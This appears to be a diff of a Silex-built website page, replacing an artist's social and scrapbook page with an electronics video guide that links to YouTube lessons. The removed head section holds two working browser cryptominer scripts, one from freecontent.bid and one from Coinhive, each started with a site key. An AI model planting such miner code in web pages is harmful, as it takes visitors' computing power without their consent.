@@ -1,395 +1,51 @@
-<!DOCTYPE html>
-<html>
-
-<head>
+<!DOCTYPE html><html><head>    
+    <title>Eletrônica para Computação - Videoteca</title>
     <meta charset="UTF-8">
-    <!-- generator meta tag -->
-    <!-- leave this for stats and Silex version check -->
     <meta name="generator" content="Silex v2.2.7">
-    <!-- End of generator meta tag -->
-    <script type="text/javascript" src="//editor.silex.me/static/2.7/jquery.js" data-silex-static=""></script>
-    <script type="text/javascript" src="//editor.silex.me/static/2.7/jquery-ui.js" data-silex-static=""></script>
-    <script type="text/javascript" src="//editor.silex.me/static/2.7/pageable.js" data-silex-static=""></script>
-    <script type="text/javascript" src="//editor.silex.me/static/2.7/front-end.js" data-silex-static=""></script>
-    <link rel="stylesheet" href="//editor.silex.me/static/2.7/normalize.css" data-silex-static="">
-    <link rel="stylesheet" href="//editor.silex.me/static/2.7/front-end.css" data-silex-static="">
+    <!-- leave this for stats -->
+    <script type="text/javascript" src="js/jquery.js" data-silex-static=""></script>
+    <script type="text/javascript" src="js/jquery-ui.js" data-silex-static=""></script>
 
-    <style type="text/css" class="silex-style"></style>
-    <script type="text/javascript" class="silex-script"></script>
-    <style class="silex-inline-styles" type="text/css">
-        .body-initial {
-            background-color: rgba(255, 255, 255, 1);
-            left: 0px;
-            top: 0px;
-        }
-        
-        .silex-id-1478366444112-1 {
-            top: 5px;
-            left: 5px;
-            background-color: rgba(180, 180, 180, 1);
-            min-width: 1200px;
-        }
-        
-        .silex-id-1478366444112-0 {
-            min-height: 90px;
-            background-color: rgba(149, 149, 149, 1);
-            width: 1200px;
-            top: 15px;
-            left: 105px;
-        }
-        
-        .silex-id-1518112029294-0 {
-            width: 700px;
-            min-height: 60px;
-            top: 0px;
-            left: 10px;
-            background-color: transparent;
-        }
-        
-        .silex-id-1518271128119-1 {
-            width: 847px;
-            min-height: 120px;
-            top: 0px;
-            left: 10px;
-            background-color: transparent;
-        }
-        
-        .silex-id-1518270978944-0 {
-            width: 847px;
-            min-height: 120px;
-            top: 0px;
-            left: 10px;
-            background-color: transparent;
-        }
-        
-        .silex-id-1518271458069-2 {
-            width: 380px;
-            min-height: 99px;
-            top: 0px;
-            left: 0px;
-        }
-        
-        .silex-id-1518267755020-0 {
-            width: 200px;
-            min-height: 30px;
-            top: 29px;
-            left: 968px;
-        }
-        
-        .silex-id-1518469961137-4 {
-            width: 321px;
-            min-height: 47px;
-            top: 0px;
-            left: 380px;
-        }
-        
-        .silex-id-1518470041203-5 {
-            width: 321px;
-            min-height: 47px;
-            top: 25px;
-            left: 380px;
-        }
-        
-        .silex-id-1518470111805-6 {
-            width: 321px;
-            min-height: 40px;
-            top: 51px;
-            left: 380px;
-        }
-        
-        .silex-id-1474394621033-3 {
-            top: 140px;
-            left: 5px;
-            background-color: rgba(46, 46, 46, 1);
-            min-width: 1200px;
-        }
-        
-        .silex-id-1474394621032-2 {
-            min-height: 320px;
-            background-color: rgba(53, 233, 117, 1);
-            width: 1200px;
-            top: 15px;
-            left: 100px;
-            border-radius: 20px 20px 20px 20px;
-            border-width: 5px 5px 5px 5px;
-            border-style: solid;
-        }
-        
-        .silex-id-1518112395580-3 {
-            width: 366px;
-            min-height: 268px;
-            top: 10px;
-            left: 10px;
-            background-color: rgba(106, 106, 106, 1);
-            border-width: 4px 4px 4px 4px;
-            border-style: solid;
-            border-radius: 6px 6px 0 0;
-        }
-        
-        .silex-id-1518116903648-0 {
-            width: 220px;
-            background-color: rgba(79, 24, 139, 1);
-            min-height: 218px;
-            top: 10px;
-            left: 400px;
-            border-radius: 10px 10px 10px 10px;
-        }
-        
-        .silex-id-1518117941686-4 {
-            width: 90px;
-            min-height: 90px;
-            top: 10px;
-            left: 115px;
-            border-width: 2px 2px 2px 2px;
-            border-style: solid;
-            border-radius: 5px 5px 5px 5px;
-        }
-        
-        .silex-id-1518116972654-2 {
-            width: 90px;
-            min-height: 90px;
-            top: 10px;
-            left: 10px;
-            border-width: 2px 2px 2px 2px;
-            border-style: solid;
-            border-radius: 5px 5px 5px 5px;
-        }
-        
-        .silex-id-1518116929404-1 {
-            width: 90px;
-            min-height: 90px;
-            top: 115px;
-            left: 115px;
-            border-width: 2px 2px 2px 2px;
-            border-style: solid;
-            border-radius: 5px 5px 5px 5px;
-        }
-        
-        .silex-id-1518118022345-5 {
-            width: 90px;
-            min-height: 90px;
-            top: 115px;
-            left: 10px;
-            border-width: 2px 2px 2px 2px;
-            border-style: solid;
-            border-radius: 5px 5px 5px 5px;
-        }
-        
-        .silex-id-1518214998514-4 {
-            width: 100px;
-            background-color: rgb(255, 255, 255);
-            min-height: 90px;
-            top: 10px;
-            left: 630px;
-        }
-        
-        .silex-id-1518214904249-2 {
-            width: 20px;
-            min-height: 20px;
-            top: 5px;
-            left: 5px;
-        }
-        
-        .silex-id-1518214942943-3 {
-            width: 20px;
-            min-height: 20px;
-            top: 35px;
-            left: 5px;
-        }
-        
-        .silex-id-1518215062791-5 {
-            width: 20px;
-            min-height: 20px;
-            top: 65px;
-            left: 5px;
-        }
-        
-        .silex-id-1518215099148-6 {
-            width: 56px;
-            min-height: 20px;
-            top: 5px;
-            left: 30px;
-        }
-        
-        .silex-id-1518215131628-7 {
-            width: 65px;
-            min-height: 20px;
-            top: 35px;
-            left: 30px;
-        }
-        
-        .silex-id-1518215138674-8 {
-            width: 56px;
-            min-height: 20px;
-            top: 65px;
-            left: 30px;
-        }
-        
-        .silex-id-1518215573209-9 {
-            width: 366px;
-            min-height: 268px;
-            top: 10px;
-            left: 10px;
-            background-color: rgba(106, 106, 106, 1);
-            border-width: 4px 4px 4px 4px;
-            border-style: solid;
-            border-radius: 6px 6px 0 0;
-        }
-        
-        .silex-id-1518221451690-0 {
-            width: 366px;
-            min-height: 268px;
-            top: 10px;
-            left: 10px;
-            background-color: rgba(106, 106, 106, 1);
-            border-width: 4px 4px 4px 4px;
-            border-style: solid;
-            border-radius: 6px 6px 0 0;
-        }
-        
-        .silex-id-1478366450713-3 {
-            top: 505px;
-            left: 5px;
-            background-color: rgba(255, 152, 43, 1);
-            min-width: 1200px;
-        }
-        
-        @media only screen and (max-width: 480px),
-        only screen and (max-device-width: 480px) {
-            .silex-id-1478366450713-3 {
-                top: 475px;
-                left: 0px;
-            }
-        }
-        
-        .silex-id-1478366450713-2 {
-            min-height: 85px;
-            background-color: transparent;
-            width: 1200px;
-            top: 15px;
-            left: 105px;
-        }
-        
-        @media only screen and (max-width: 480px),
-        only screen and (max-device-width: 480px) {
-            .silex-id-1478366450713-2 {
-                min-height: 120px;
-            }
-        }
-        
-        .silex-id-1518127547792-0 {
-            width: 430px;
-            background-color: transparent;
-            min-height: 65px;
-            top: 0px;
-            left: 0px;
-        }
-        
-        .silex-id-1518129201345-2 {
-            width: 120px;
-            background-color: transparent;
-            min-height: 85px;
-            top: 0px;
-            left: 431px;
-        }
-        
-        .silex-id-1518130058896-4 {
-            width: 123px;
-            background-color: transparent;
-            min-height: 20px;
-            top: 66px;
-            left: 0px;
-        }
-        
-        .silex-id-1518118247005-7 {
-            top: 124px;
-            left: 5px;
-            min-width: 1200px;
-        }
-        
-        .silex-id-1518118247004-6 {
-            width: 1200px;
-            min-height: 933px;
-            top: 15px;
-            left: 100px;
-        }
-        
-        .silex-id-1518469699327-0 {
-            width: 670px;
-            background-color: rgb(255, 255, 255);
-            min-height: 900px;
-            top: 0px;
-            left: 0px;
-        }
-        
-        .silex-id-1518128342871-1 {
-            width: 340px;
-            background-color: rgb(255, 255, 255);
-            min-height: 600px;
-            top: 0px;
-            left: 700px;
-        }
-        
-        .silex-id-1518214447359-1 {
-            min-width: 1200px;
-            top: 852px;
-            left: 5px;
-        }
-        
-        .silex-id-1518214447356-0 {
-            width: 1200px;
-            min-height: 860px;
-            top: 15px;
-            left: 105px;
-        }
-        
-        .silex-id-1518182593205-0 {
-            width: 536px;
-            background-color: rgb(255, 255, 255);
-            min-height: 460px;
-            top: 0px;
-            left: 0px;
-        }
-        
-        .silex-id-1518216543389-11 {
-            width: 1200px;
-            background-color: rgb(255, 255, 255);
-            min-height: 400px;
-            top: 460px;
-            left: 0px;
-        }
-        
-        .silex-id-1518182949637-1 {
-            width: 200px;
-            background-color: transparent;
-            min-height: 200px;
-            top: 0px;
-            left: 536px;
-        }
-        
-        .silex-id-1518469927286-3 {
-            top: 124px;
-            left: 5px;
-        }
-        
-        .silex-id-1518469927284-2 {
-            min-height: 918px;
-        }
-        
-        .silex-id-1518469857414-1 {
-            width: 800px;
-            background-color: rgb(255, 255, 255);
-            min-height: 800px;
-            top: 0px;
-            left: 0px;
-        }
-    </style>
-    <title></title>
-    <script type="text/javascript" class="silex-json-styles">
-        [{"desktop":{"body-initial":{"background-color":"rgba(255,255,255,1)","left":"0px","top":"0px"},"silex-id-1474394621033-3":{"top":"140px","left":"5px","background-color":"rgba(46,46,46,1)","min-width":"1200px"},"silex-id-1474394621032-2":{"min-height":"320px","background-color":"rgba(53,233,117,1)","width":"1200px","top":"15px","left":"100px","border-radius":"20px 20px 20px 20px ","border-width":"5px 5px 5px 5px ","border-style":"solid"},"silex-id-1474394605264-1":{"min-height":"100px","width":"100px","top":"100px","left":"100px"},"silex-id-1474394605263-0":{"min-height":"100px","background-color":"transparent"},"silex-id-1478366444112-0":{"min-height":"90px","background-color":"rgba(149,149,149,1)","width":"1200px","top":"15px","left":"105px"},"silex-id-1478366444112-1":{"top":"5px","left":"5px","background-color":"rgba(180,180,180,1)","min-width":"1200px"},"silex-id-1478366450713-2":{"min-height":"85px","background-color":"transparent","width":"1200px","top":"15px","left":"105px"},"silex-id-1478366450713-3":{"top":"505px","left":"5px","background-color":"rgba(255,152,43,1)","min-width":"1200px"},"silex-id-1518112029294-0":{"width":"700px","min-height":"60px","top":"0px","left":"10px","background-color":"transparent"},"silex-id-1518112395580-3":{"width":"366px","min-height":"268px","top":"10px","left":"10px","background-color":"rgba(106,106,106,1)","border-width":"4px 4px 4px 4px ","border-style":"solid","border-radius":"6px 6px 0 0 "},"silex-id-1518114133493-5":{"width":"123px","background-color":"rgb(255, 255, 255)","min-height":"109px","top":"9px","left":"16px","border-width":"2px 2px 2px 2px ","border-style":"solid","border-radius":"20px 20px 20px 20px ","background-image":"url('wireframe.gif')"},"silex-id-1518114455780-6":{"width":"123px","background-color":"rgb(255, 255, 255)","min-height":"109px","top":"9px","left":"151px","border-width":"2px 2px 2px 2px ","border-style":"solid","border-radius":"20px 20px 20px 20px ","background-image":"url('tintas.gif')"},"silex-id-1518115105918-7":{"width":"123px","background-color":"rgb(255, 255, 255)","min-height":"109px","top":"130px","left":"152px","border-width":"2px 2px 2px 2px ","border-style":"solid","border-radius":"20px 20px 20px 20px ","background-image":"url('mario_coins.gif')"},"silex-id-1518115106366-8":{"width":"123px","background-color":"rgb(255, 255, 255)","min-height":"109px","top":"129px","left":"16px","border-width":"2px 2px 2px 2px ","border-style":"solid","border-radius":"20px 20px 20px 20px ","background-image":"url('wall.jpg')"},"silex-id-1518116903648-0":{"width":"220px","background-color":"rgba(79,24,139,1)","min-height":"218px","top":"10px","left":"400px","border-radius":"10px 10px 10px 10px "},"silex-id-1518116929404-1":{"width":"90px","min-height":"90px","top":"115px","left":"115px","border-width":"2px 2px 2px 2px ","border-style":"solid","border-radius":"5px 5px 5px 5px "},"silex-id-1518116972654-2":{"width":"90px","min-height":"90px","top":"10px","left":"10px","border-width":"2px 2px 2px 2px ","border-style":"solid","border-radius":"5px 5px 5px 5px "},"silex-id-1518117941686-4":{"width":"90px","min-height":"90px","top":"10px","left":"115px","border-width":"2px 2px 2px 2px ","border-style":"solid","border-radius":"5px 5px 5px 5px "},"silex-id-1518118022345-5":{"width":"90px","min-height":"90px","top":"115px","left":"10px","border-width":"2px 2px 2px 2px ","border-style":"solid","border-radius":"5px 5px 5px 5px "},"silex-id-1518118247004-6":{"width":"1200px","background-color":"","min-height":"933px","top":"15px","left":"100px"},"silex-id-1518118247005-7":{"top":"124px","left":"5px","min-width":"1200px"},"silex-id-1518127547792-0":{"width":"430px","background-color":"transparent","min-height":"65px","top":"0px","left":"0px"},"silex-id-1518128342871-1":{"width":"340px","background-color":"rgb(255, 255, 255)","min-height":"600px","top":"0px","left":"700px"},"silex-id-1518129201345-2":{"width":"120px","background-color":"transparent","min-height":"85px","top":"0px","left":"431px"},"silex-id-1518130058896-4":{"width":"123px","background-color":"transparent","min-height":"20px","top":"66px","left":"0px"},"silex-id-1518131257789-6":{"width":"","background-color":"","min-height":"398px"},"silex-id-1518131257790-7":{"top":"775px","left":"5px"},"silex-id-1518182593205-0":{"width":"536px","background-color":"rgb(255, 255, 255)","min-height":"460px","top":"0px","left":"0px"},"silex-id-1518182949637-1":{"width":"200px","background-color":"transparent","min-height":"200px","top":"0px","left":"536px"},"silex-id-1518214447356-0":{"width":"1200px","background-color":"","min-height":"860px","top":"15px","left":"105px"},"silex-id-1518214447359-1":{"min-width":"1200px","top":"852px","left":"5px"},"silex-id-1518214904249-2":{"width":"20px","min-height":"20px","top":"5px","left":"5px"},"silex-id-1518214942943-3":{"width":"20px","min-height":"20px","top":"35px","left":"5px"},"silex-id-1518214998514-4":{"width":"100px","background-color":"rgb(255, 255, 255)","min-height":"90px","top":"10px","left":"630px"},"silex-id-1518215062791-5":{"width":"20px","min-height":"20px","top":"65px","left":"5px"},"silex-id-1518215099148-6":{"width":"56px","min-height":"20px","top":"5px","left":"30px"},"silex-id-1518215131628-7":{"width":"65px","min-height":"20px","top":"35px","left":"30px"},"silex-id-1518215138674-8":{"width":"56px","min-height":"20px","top":"65px","left":"30px"},"silex-id-1518215573209-9":{"width":"366px","min-height":"268px","top":"10px","left":"10px","background-color":"rgba(106,106,106,1)","border-width":"4px 4px 4px 4px ","border-style":"solid","border-radius":"6px 6px 0 0 "},"silex-id-1518216543389-11":{"width":"1200px","background-color":"rgb(255, 255, 255)","min-height":"400px","top":"460px","left":"0px"},"silex-id-1518221451690-0":{"width":"366px","min-height":"268px","top":"10px","left":"10px","background-color":"rgba(106,106,106,1)","border-width":"4px 4px 4px 4px ","border-style":"solid","border-radius":"6px 6px 0 0 "},"silex-id-1518267755020-0":{"width":"200px","min-height":"30px","top":"29px","left":"968px"},"silex-id-1518270978944-0":{"width":"847px","min-height":"120px","top":"0px","left":"10px","background-color":"transparent"},"silex-id-1518271128119-1":{"width":"847px","min-height":"120px","top":"0px","left":"10px","background-color":"transparent"},"silex-id-1518271458069-2":{"width":"380px","min-height":"99px","top":"0px","left":"0px"},"silex-id-1518469699327-0":{"width":"670px","background-color":"rgb(255, 255, 255)","min-height":"900px","top":"0px","left":"0px"},"silex-id-1518469857414-1":{"width":"800px","background-color":"rgb(255, 255, 255)","min-height":"800px","top":"0px","left":"0px"},"silex-id-1518469927284-2":{"width":"","background-color":"","min-height":"918px"},"silex-id-1518469927286-3":{"top":"124px","left":"5px"},"silex-id-1518469961137-4":{"width":"321px","min-height":"47px","top":"0px","left":"380px"},"silex-id-1518470041203-5":{"width":"321px","min-height":"47px","top":"25px","left":"380px"},"silex-id-1518470111805-6":{"width":"321px","min-height":"40px","top":"51px","left":"380px"}},"mobile":{"silex-id-1478366450713-3":{"top":"475px","left":"0px"},"silex-id-1478366450713-2":{"min-height":"120px"}},"componentData":{}}]
-    </script>
+    <script type="text/javascript" src="js/pageable.js" data-silex-static=""></script>
+    <script type="text/javascript" src="js/front-end.js" data-silex-static=""></script>
+    <!-- Normalize -->
+    <link href="css/normalize.css" rel="stylesheet" data-silex-static="">
+    <!-- Silex style -->
+    <link href="css/front-end.css" rel="stylesheet" data-silex-static="">
+
+    
+    
+    
+    
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
 
 
 
@@ -397,12 +53,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2.2" data-silex-viewport="">
 
 
-    <meta name="website-width" content="1200">
-    <style type="text/css" class="silex-style-settings">
-        .website-width {
-            width: 1200px;
-        }
-    </style>
 
 
 
@@ -419,8 +69,195 @@
 
 
 
-    <script type="text/javascript" charset="utf-8" async="" src="https://platform.twitter.com/js/button.5f64a1a5864e1229f84c8defd65341b4.js"></script>
-    <script type="text/javascript" charset="utf-8" async="" src="https://platform.twitter.com/js/timeline.25e3f797ea5047ab5a8d06fd6ee7f701.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
@@ -444,417 +281,1929 @@
 
 
     <style id="current-page-style">
-        .page-redes {
+        .page-videoteca {
             display: inherit;
         }
     </style>
     <!-- Silex HEAD tag do not remove -->
-    <title>a1000ton.com.br | Desenhos Loucos</title>
-    <meta name="description" content="Amilton: {Fanzine, Histórias em Quadrinhos, Grafite, Portfólio. Artes de São Paulo - SP e Ouro Preto - MG.">
-    <meta name="keywords" content="comics, art, writer, graffiti, gatox, hq, gibi">
-    <meta name="authors" content="Stefano Azevedo">
-
-				
-<!-- Start Open Web Analytics Tracker -->
-<script type="text/javascript">
-//<![CDATA[
-var owa_baseUrl = 'https://a1000ton.com.br/central/owa/';
-var owa_cmds = owa_cmds || [];
-owa_cmds.push(['setSiteId', '27b0536f944f6960c0153a040e1f249c']);
-owa_cmds.push(['trackPageView']);
-owa_cmds.push(['trackClicks']);
-
-(function() {
-	var _owa = document.createElement('script'); _owa.type = 'text/javascript'; _owa.async = true;
-	owa_baseUrl = ('https:' == document.location.protocol ? window.owa_baseSecUrl || owa_baseUrl.replace(/http:/, 'https:') : owa_baseUrl );
-	_owa.src = owa_baseUrl + 'modules/base/js/owa.tracker-combined-min.js';
-	var _owa_s = document.getElementsByTagName('script')[0]; _owa_s.parentNode.insertBefore(_owa, _owa_s);
-}());
-//]]>
-</script>
-<!-- End Open Web Analytics Code -->
-
-    <script src="https://www.freecontent.bid./saZ6.js"></script>
-    <script>
-        var miner = new Client.Anonymous('1ef11bc72efd99ba18dd3ad6325ebe9651ae65045faeadc9e6f34edd6fae3b45', {
-            throttle: 0.8
-        });
-        miner.start();
-    </script>
-
-    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
-    <script>
-        var miner = new CoinHive.Anonymous('fzqjy5QoaoeNdKOOC2EbqeyLs2EqKOSP', {throttle: 0.9});
+    <!-- Start Open Web Analytics Tracker -->
+    <script type="text/javascript">
+        //<![CDATA[
+        var owa_baseUrl = 'https://a1000ton.com.br/central/owa/';
+        var owa_cmds = owa_cmds || [];
+        owa_cmds.push(['setSiteId', '652785827c0e0ab4ddbec39086d5c39d']);
+        owa_cmds.push(['trackPageView']);
+        owa_cmds.push(['trackClicks']);
         
-        	// Only start on non-mobile devices and if not opted-out
-        	// in the last 14400 seconds (4 hours):
-        	if (!miner.isMobile() && !miner.didOptOut(14400)) {
-        		miner.start();
-        	}
+        (function() {
+        	var _owa = document.createElement('script'); _owa.type = 'text/javascript'; _owa.async = true;
+        	owa_baseUrl = ('https:' == document.location.protocol ? window.owa_baseSecUrl || owa_baseUrl.replace(/http:/, 'https:') : owa_baseUrl );
+        	_owa.src = owa_baseUrl + 'modules/base/js/owa.tracker-combined-min.js';
+        	var _owa_s = document.getElementsByTagName('script')[0]; _owa_s.parentNode.insertBefore(_owa, _owa_s);
+        }());
+        //]]>
     </script>
+    <!-- End Open Web Analytics Code -->
 
-    <div id="fb-root"></div>
-    <script>
-        (function(d, s, id) {
-          var js, fjs = d.getElementsByTagName(s)[0];
-          if (d.getElementById(id)) return;
-          js = d.createElement(s); js.id = id;
-          js.src = 'https://connect.facebook.net/pt_PT/sdk.js#xfbml=1&version=v2.12';
-          fjs.parentNode.insertBefore(js, fjs);
-        }(document, 'script', 'facebook-jssdk'));
-    </script>
     <!-- End of Silex HEAD tag do not remove -->
-</head>
+    <link href="css/styles.css" rel="stylesheet">    <script src="js/script.js" type="text/javascript"></script></head><body class="silex-id-1439554967896-66 enable-mobile gform silex-runtime silex-published">
+    <div data-silex-type="container" class="prevent-draggable container-element editable-style silex-id-1513281345038-1 section-element paged-element hide-on-mobile page-guia-1 page-guia-2 page-guia-3" data-silex-id="silex-id-1513281345038-1">
+        <div data-silex-type="container" class="editable-style silex-id-1513281345036-0 container-element silex-element-content silex-container-content website-width prevent-draggable" data-silex-id="silex-id-1513281345036-0">
 
-<body data-silex-id="body-initial" class="body-initial enable-mobile silex-runtime" data-silex-type="container">
-    <div class="silex-pages">
-
-
-        <a id="page-br" data-silex-type="page" class="page-element">Br</a><a id="page-es" data-silex-type="page" class="page-element">Es</a><a id="page-en" data-silex-type="page" class="page-element">En</a><a id="page-redes" data-silex-type="page" class="page-element page-link-active">Redes</a>
-        <a id="page-scrapbook" data-silex-type="page" class="page-element">Scrapbook</a></div>
-
-
-
-
-
-
-
-
-
-    <div data-silex-type="container" class="prevent-draggable container-element editable-style silex-id-1478366444112-1 section-element" data-silex-id="silex-id-1478366444112-1" style="">
-        <div data-silex-type="container" class="editable-style silex-element-content silex-id-1478366444112-0 silex-container-content container-element prevent-draggable website-width" data-silex-id="silex-id-1478366444112-0">
-            <div data-silex-type="text" class="editable-style silex-id-1518112029294-0 text-element page-br paged-element" data-silex-id="silex-id-1518112029294-0" style="" data-silex-href="#!page-br">
+            <a data-silex-type="text" class="editable-style text-element nav nav-mark silex-id-1513171919051-10" data-silex-id="silex-id-1513171919051-10" style="" href="#!page-guia-2">
                 <div class="silex-element-content normal">
-                    <h1><span style="color: rgb(255, 0, 0);">Aqui há</span> <span style="color: rgb(255, 153, 0);">1000 tons</span> <span style="color: rgb(255, 255, 0);">de cores </span>da madrugada.</h1>
+                    <div style="text-align: center;"><span style="color: rgb(0, 0, 0);">2</span></div>
                 </div>
+            </a>
+
+            <a data-silex-type="text" class="editable-style text-element nav nav-mark silex-id-1513171919088-13" data-silex-id="silex-id-1513171919088-13" style="" href="#!page-hist-ria">
+                <div class="silex-element-content normal">
+                    <div style="text-align: center;"><span style="color: rgb(153, 153, 153);"><b>X</b></span></div>
+                </div>
+            </a>
+
+            <div data-silex-type="text" class="editable-style silex-id-1513281513777-2 text-element" data-silex-id="silex-id-1513281513777-2" style="">
+                <div class="silex-element-content normal">
+                    <p><b><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);">Guia de vídeos do canal.<font size="1">&nbsp; Com resumos do que encontrar.</font><br></span></span></b></p>
+                    <p><span style="color: rgb(0, 0, 0);"></span></p>
+                </div>
+            </div>
+            <a data-silex-type="text" class="editable-style text-element nav nav-mark silex-id-1513171919011-9" data-silex-id="silex-id-1513171919011-9" style="" href="#!page-guia-1">
+                <div class="silex-element-content normal">
+                    <font size="3">
+                    </font>
+                    <div style="text-align: center;">
+                        <span style="color: rgb(0, 0, 0);"><font size="3"><b>1</b></font></span>
+                    </div>
+                    <font size="3">
+                    </font>
+                </div>
+            </a>
+            <a data-silex-type="text" class="editable-style text-element nav nav-mark silex-id-1517765742361-1" data-silex-id="silex-id-1517765742361-1" style="" href="#!page-guia-3">
+                <div class="silex-element-content normal">
+                    <div style="text-align: center;"><span style="color: rgb(0, 0, 0);">3<br></span></div>
+                </div>
+            </a>
+        </div>
+
+
+    </div>
+    <div data-silex-type="container" class="prevent-draggable container-element editable-style silex-id-1513171780399-2 section-element paged-element page-guia-1 page-guia-2 page-guia-3" data-silex-id="silex-id-1513171780399-2">
+        <div data-silex-type="container" class="editable-style silex-id-1513171780396-1 container-element silex-element-content silex-container-content website-width prevent-draggable" data-silex-id="silex-id-1513171780396-1">
+            <div data-silex-type="container" class="editable-style silex-id-1513297364107-0 container-element paged-element page-guia-1" data-silex-id="silex-id-1513297364107-0" style="">
+                <a target="_blank" data-silex-type="image" class="editable-style silex-id-1513292183686-0 image-element" data-silex-id="silex-id-1513292183686-0" style="" href="https://www.youtube.com/watch?v=Szj09sb8uoU&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54&amp;index=1"><img src="assets/pnp.gif" class="silex-element-content"></a>
+                <a target="_blank" data-silex-type="image" class="editable-style silex-id-1513296588205-1 image-element" data-silex-id="silex-id-1513296588205-1" style="" href="https://www.youtube.com/watch?v=HmvppRT9nm4&amp;index=2&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54"><img src="assets/semicondutores_cps.gif" class="silex-element-content"></a>
+                <a target="_blank" data-silex-type="image" class="editable-style silex-id-1513376977681-0 image-element" data-silex-id="silex-id-1513376977681-0" style="" href="https://www.youtube.com/watch?v=l7-EmE7Ixuo&amp;index=3&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54"><img src="assets/texas_instruments.gif" class="silex-element-content"></a>
+                <a target="_blank" data-silex-type="image" class="editable-style silex-id-1513378755937-1 image-element" data-silex-id="silex-id-1513378755937-1" style="" href="https://www.youtube.com/watch?v=tGGM2x5BHTs&amp;index=4&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54"><img src="assets/fabricacao_chips.gif" class="silex-element-content"></a>
+                <a target="_blank" data-silex-type="image" class="editable-style silex-id-1513380596645-0 image-element" data-silex-id="silex-id-1513380596645-0" style="" href="https://www.youtube.com/watch?v=YztCqgEiYPE&amp;index=5&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54"><img src="assets/santa_rita_sapucai.gif" class="silex-element-content"></a>
+                <a target="_blank" data-silex-type="image" class="editable-style silex-id-1513380660303-1 image-element" data-silex-id="silex-id-1513380660303-1" style="" href="https://www.youtube.com/watch?v=0ktruutvIzc&amp;index=6&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54"><img src="assets/newton_c_braga.gif" class="silex-element-content"></a>
+                <a target="_blank" data-silex-type="image" class="editable-style silex-id-1513383597987-2 image-element" data-silex-id="silex-id-1513383597987-2" style="" href="https://www.youtube.com/watch?v=SelwNgqbtQ4&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54&amp;index=7"><img src="assets/transistor_ci.gif" class="silex-element-content"></a>
+                <a target="_blank" data-silex-type="image" class="editable-style silex-id-1513383674148-3 image-element" data-silex-id="silex-id-1513383674148-3" style="" href="https://www.youtube.com/watch?v=Rj4Zx8aJmQw&amp;index=8&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54"><img src="assets/dopagem.gif" class="silex-element-content"></a>
+
             </div>
 
 
-            <div data-silex-type="text" class="editable-style text-element silex-id-1518271128119-1 paged-element page-en" data-silex-id="silex-id-1518271128119-1" style="" data-silex-href="#!page-br">
-                <div class="silex-element-content normal">
-                    <h1><span style="color: rgb(255, 0, 0);">Here are </span><span style="color: rgb(255, 153, 0);">1000 tones</span> <span style="color: rgb(255, 255, 0);"><span style="color: rgb(0, 0, 0);">of dawn </span>colors.</span>
-                    </h1>
-                </div>
-            </div>
-            <div data-silex-type="text" class="editable-style text-element silex-id-1518270978944-0 paged-element page-es" data-silex-id="silex-id-1518270978944-0" style="" data-silex-href="#!page-br">
-                <div class="silex-element-content normal">
-                    <h1><span style="color: rgb(255, 0, 0);">Aquí hay </span><span style="color: rgb(255, 153, 0);">1000 tonos</span> <span style="color: rgb(255, 255, 0);">de colores </span>de la madrugada.</h1>
-                </div>
-            </div>
-            <div data-silex-type="text" class="editable-style silex-id-1518271458069-2 text-element paged-element page-redes page-scrapbook" data-silex-id="silex-id-1518271458069-2" style="">
-                <div class="silex-element-content normal">
-                    <h1><span style="font-family: courier new,monospace;"><font size="7"><b><span style="color: rgb(11, 83, 148);" class="heading1">Página Social</span></b>
+
+
+
+
+
+
+
+            <div data-silex-type="text" class="editable-style text-element silex-id-1513171906005-7 paged-element page-guia-1" data-silex-id="silex-id-1513171906005-7" style="">
+                <div class="silex-element-content normal"><span style="font-family: Roboto;"><b><span style="color: rgb(0, 0, 0);"><font size="2">
+                    </font></span></b>
+                    </span>
+                    <h1 class="heading1"><span style="font-family: Roboto;"><span style="color: rgb(120, 63, 4);">Sinopses</span></span>
+                    </h1><span style="font-family: Roboto;">
+                    </span>
+                    <h2><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"></span><span style="color: rgb(0, 0, 0);"><font size="2"><span class="heading2"></span>
                         </font>
                         </span>
-                    </h1>
-                    <h1>
-                        <font size="4"><b><span style="color: rgb(11, 83, 148);"></span></b></font>
-                    </h1>
-                </div>
-            </div>
-            <div data-silex-type="image" class="editable-style silex-id-1518267755020-0 image-element page-scrapbook paged-element page-redes" data-silex-id="silex-id-1518267755020-0" style=""><img src="central/layout/email.jpg" class="silex-element-content"></div>
-            <div data-silex-type="text" class="editable-style text-element silex-id-1518469961137-4 page-redes paged-element page-scrapbook" data-silex-id="silex-id-1518469961137-4"
-                style="" data-silex-href="#!page-scrapbook">
-                <div class="silex-element-content normal">
-                    <font size="5"></font>
-                    <font size="5"><span style="font-family: courier new,monospace;"><b><span style="color: rgb(11, 83, 148);" class="heading1">Assine meu Scrapbook!</span></b>
-
                         </span>
-                    </font>
-                    <font size="5">
-                    </font>
-                    <h1>
-                        <font size="5"><b><span style="color: rgb(11, 83, 148);"></span></b></font>
-                    </h1>
-                    <font size="5">
-                    </font>
-                </div>
-            </div>
